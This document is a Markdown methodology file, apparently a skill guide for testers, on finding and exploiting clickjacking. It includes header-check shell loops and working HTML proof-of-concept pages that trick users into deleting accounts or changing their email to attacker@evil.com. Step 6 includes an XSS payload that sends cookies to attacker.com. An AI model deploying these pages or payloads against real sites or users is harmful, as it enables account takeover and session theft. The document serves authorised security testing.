---
name: clickjacking
description: Clickjacking testing covering X-Frame-Options bypasses, CSP frame-ancestors bypasses, multistep clickjacking, and prefilled form exploitation
---

# Clickjacking — Testing Methodology

Clickjacking tricks a user into clicking something different from what they perceive, by overlaying an invisible iframe of the target site over an attacker-controlled page. This enables unauthorized actions (account deletion, password changes, fund transfers) via the victim's authenticated session.

## Step 1: Check Frame Protection

```bash
# Check X-Frame-Options header
curl -sI "https://TARGET/" | grep -iE "x-frame-options|content-security-policy"

# Check CSP frame-ancestors
curl -sI "https://TARGET/" | grep -i "content-security-policy" | grep -i "frame-ancestors"

# Test specific pages (protection may vary per endpoint)
for path in / /account /settings /delete-account /change-email /admin /transfer; do
  XFO=$(curl -sI "https://TARGET$path" 2>/dev/null | grep -i "x-frame-options" | head -1)
  CSP=$(curl -sI "https://TARGET$path" 2>/dev/null | grep -i "frame-ancestors" | head -1)
  echo "$path → XFO: ${XFO:-NONE} | frame-ancestors: ${CSP:-NONE}"
done

# NO X-Frame-Options AND no frame-ancestors → vulnerable to clickjacking
```

## Step 2: Basic Clickjacking PoC

```html
<!-- Save as clickjack.html, serve from attacker server -->
<html>
<head><title>Clickjacking PoC</title></head>
<body>
<style>
  #target {
    position: relative;
    width: 800px;
    height: 600px;
    opacity: 0.0001;  /* Nearly invisible */
    z-index: 2;
  }
  #decoy {
    position: absolute;
    top: 0; left: 0;
    width: 800px;
    height: 600px;
    z-index: 1;
  }
  /* Position the click target precisely */
  #target {
    top: -100px;
    left: -50px;
  }
</style>
<div id="decoy">
  <h1>Click here to win a prize!</h1>
  <button style="font-size:24px;padding:20px;cursor:pointer;">CLAIM PRIZE</button>
</div>
<iframe id="target" src="https://TARGET/delete-account"></iframe>
</body>
</html>
```

## Step 3: Multistep Clickjacking

When the action requires multiple clicks (e.g., confirmation dialogs):

```html
<html>
<head><title>Multi-step Clickjacking</title></head>
<body>
<style>
  iframe { position: absolute; opacity: 0.0001; z-index: 2; width: 800px; height: 600px; }
  .decoy { position: absolute; z-index: 1; }
</style>

<div class="decoy" id="step1" style="top:350px;left:80px;">
  <button onclick="step2()" style="font-size:20px;padding:15px;">Click to continue →</button>
</div>
<div class="decoy" id="step2div" style="top:350px;left:200px;display:none;">
  <button style="font-size:20px;padding:15px;">Confirm ✓</button>
</div>

<iframe id="target" src="https://TARGET/delete-account"></iframe>

<script>
function step2() {
  document.getElementById('step1').style.display = 'none';
  document.getElementById('step2div').style.display = 'block';
  // Reposition iframe so the confirmation button aligns with decoy
  document.getElementById('target').style.top = '-200px';
  document.getElementById('target').style.left = '-100px';
}
</script>
</body>
</html>
```

## Step 4: Clickjacking with Prefilled Form Input

```html
<!-- Exploit: change victim's email via prefilled form -->
<html>
<body>
<style>
  iframe { position: absolute; opacity: 0.0001; z-index: 2; width: 800px; height: 600px; }
</style>
<h1>Click to claim your reward!</h1>
<button style="font-size:24px;padding:20px;position:absolute;top:350px;left:80px;z-index:1;">
  CLAIM NOW
</button>
<!-- Prefill the form via URL parameter -->
<iframe src="https://TARGET/change-email?email=attacker@evil.com"></iframe>
</body>
</html>
```

## Step 5: X-Frame-Options Bypass Techniques

```bash
# XFO only blocks top-level framing — double framing may bypass SAMEORIGIN
# If TARGET sets X-Frame-Options: SAMEORIGIN
# Frame TARGET within an iframe from a subdomain of the same origin

# Check if any subdomains are frameable
curl -sI "https://subdomain.TARGET/" | grep -i "x-frame-options"

# Frame sandbox attribute bypass (older browsers)
# sandbox="allow-scripts allow-forms" but no "allow-top-navigation"

# Per-page inconsistency — some pages may lack XFO
for path in /forgotten-password /signup /contact /help /terms /about; do
  XFO=$(curl -sI "https://TARGET$path" 2>/dev/null | grep -ci "x-frame-options")
  if [ "$XFO" = "0" ]; then
    echo "[VULN] No X-Frame-Options on: $path"
  fi
done
```

## Step 6: Clickjacking + XSS Combination

```html
<!-- If an XSS exists on a frameable page, clickjacking multiplies the impact -->
<iframe src="https://TARGET/search?q=<script>document.location='https://attacker.com/?cookie='+document.cookie</script>"></iframe>
<!-- Victim clicks decoy → XSS fires in the iframe context with victim's session -->
```

## Testing Methodology

1. **Check headers** — `X-Frame-Options` and `Content-Security-Policy: frame-ancestors` on ALL pages
2. **Find unprotected pages** — test every endpoint, especially state-changing ones
3. **Build PoC** — create HTML with invisible iframe + visible decoy
4. **Test in browser** — open PoC, verify iframe loads the target page
5. **Demonstrate impact** — show a realistic attack scenario (account deletion, email change, etc.)
6. **Test multistep** — if action requires confirmation, build multi-click PoC

## Validation

1. Target page loads within an iframe on attacker-controlled domain
2. No `X-Frame-Options` or `frame-ancestors` header blocks the framing
3. User action (click, form submit) can be triggered through the transparent iframe
4. State-changing action is performed using victim's authenticated session

## Impact

- **Medium**: Account modification — email change, password change via clickjacking
- **Medium**: Unauthorized actions — delete account, transfer funds, change settings
- **Low**: Information disclosure when combined with drag-and-drop techniques

## Pro Tips

1. **Always check per-page** — XFO may be set on `/` but missing on `/settings`
2. **`frame-ancestors` in CSP overrides `X-Frame-Options`** — test both
3. **Multistep clickjacking** is needed for most real-world exploits (confirmation dialogs)
4. **Prefilled forms via URL params** make clickjacking much more impactful
5. **`sandbox` attribute on iframes** can bypass some frame restrictions in older browsers
6. **Opacity must be near-zero but not zero** — `0.0001` renders but is invisible
7. **Position the iframe precisely** — use negative top/left to align the target button with the decoy
